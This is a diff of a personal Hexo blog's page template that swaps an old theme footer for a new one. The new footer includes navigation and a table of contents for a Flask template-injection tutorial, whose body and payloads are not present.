-<!-- Custom -->
-
-  <div class="col-lg-7 mx-auto nopadding-md">
-    <div class="container custom post-content mx-auto">
-      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
-    </div>
-  </div>
-
-
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  
-
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-  </div>
-  
-  <div class="statistics">
-    
-    
-
-    
-      
-        <!-- 不蒜子统计PV -->
-        <span id="busuanzi_container_site_pv" style="display: none">
-            总访问量 
-            <span id="busuanzi_value_site_pv"></span>
-             次
-          </span>
-      
-      
-        <!-- 不蒜子统计UV -->
-        <span id="busuanzi_container_site_uv" style="display: none">
-            总访客数 
-            <span id="busuanzi_value_site_uv"></span>
-             人
-          </span>
-      
-    
-  </div>
-
-
-  
-
-  
-</footer>
-
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "flask&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: true,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-      icon: "§"
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-
-<div class="text-center py-1">   
-  <div>
-    <span>Copyright © 2020</span></a>
-    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
-     <span>my blog</span></a>    <br>
-  </div>
-<div>
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>
-</div>
-
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">sunzy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sunzhengyu99.github.io/2021/02/08/flask/">https://sunzhengyu99.github.io/2021/02/08/flask/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sunzhengyu99.github.io" target="_blank">一路走到黑</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/02/03/winter-homework/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">winter_homework</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">sunzy</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x1 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">模板的基本语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">常见的魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-%E6%9E%84%E9%80%A0%E9%93%BE%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">0x2 构造链思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6payload"><span class="toc-number">2.1.</span> <span class="toc-text">读文件payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9E%84%E9%80%A0"><span class="toc-number">2.2.</span> <span class="toc-text">命令执行构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">flask内置函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%9F%BA%E7%B1%BB%E6%9F%A5%E6%89%BE%E5%AD%90%E7%B1%BB"><span class="toc-number">2.4.</span> <span class="toc-text">通过基类查找子类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">0x3 过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="toc-number">3.2.1.</span> <span class="toc-text">没过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%BC%95%E5%8F%B7"><span class="toc-number">3.2.2.</span> <span class="toc-text">过滤了引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.3.</span> <span class="toc-text">特殊字符过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.4.</span> <span class="toc-text">过滤 [</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8F%8C%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.2.5.</span> <span class="toc-text">过滤双花括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">3.2.6.</span> <span class="toc-text">过滤下划线</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-%E5%AE%9E%E6%88%98%E4%BE%8B%E5%AD%90"><span class="toc-number">4.</span> <span class="toc-text">0x4 实战例子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E5%92%8C-%E5%92%8C-39"><span class="toc-number">4.1.</span> <span class="toc-text">过滤_和.和&#39;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4args%E5%92%8C-%E5%92%8C"><span class="toc-number">4.2.</span> <span class="toc-text">过滤args和.和_</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E4%B8%BB%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E5%8F%98%E9%87%8F"><span class="toc-number">4.3.</span> <span class="toc-text">导入主函数读取变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-39-%E2%80%9C-%E5%8F%8C%E8%8A%B1%E6%8B%AC%E5%8F%B7-args-values"><span class="toc-number">4.5.</span> <span class="toc-text">过滤了 &#39;, “, [, ], _, 双花括号,args, values</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-39-%E2%80%9C-%E5%8F%8C%E8%8A%B1%E6%8B%AC%E5%8F%B7-values"><span class="toc-number">4.6.</span> <span class="toc-text">过滤了&#39;, “, [, ], _, 双花括号,values</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-39-%E2%80%9C-%E5%8F%8C%E8%8A%B1%E6%8B%AC%E5%8F%B7-args"><span class="toc-number">4.7.</span> <span class="toc-text">过滤了&#39;, “, [, ], _, 双花括号,args</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/08/flask/" title="flask"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="flask"/></a><div class="content"><a class="title" href="/2021/02/08/flask/" title="flask">flask</a><time datetime="2021-02-08T07:13:40.000Z" title="发表于 2021-02-08 15:13:40">2021-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/03/winter-homework/" title="winter_homework"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="winter_homework"/></a><div class="content"><a class="title" href="/2021/02/03/winter-homework/" title="winter_homework">winter_homework</a><time datetime="2021-02-03T13:49:09.000Z" title="发表于 2021-02-03 21:49:09">2021-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/sql-labs/" title="sql_labs"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql_labs"/></a><div class="content"><a class="title" href="/2021/01/30/sql-labs/" title="sql_labs">sql_labs</a><time datetime="2021-01-30T13:13:02.000Z" title="发表于 2021-01-30 21:13:02">2021-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/11/cumtfinal/" title="cumtfinal"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cumtfinal"/></a><div class="content"><a class="title" href="/2021/01/11/cumtfinal/" title="cumtfinal">cumtfinal</a><time datetime="2021-01-11T14:04:30.000Z" title="发表于 2021-01-11 22:04:30">2021-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="密码学"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="密码学"/></a><div class="content"><a class="title" href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="密码学">密码学</a><time datetime="2020-12-23T08:37:43.000Z" title="发表于 2020-12-23 16:37:43">2020-12-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By sunzy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
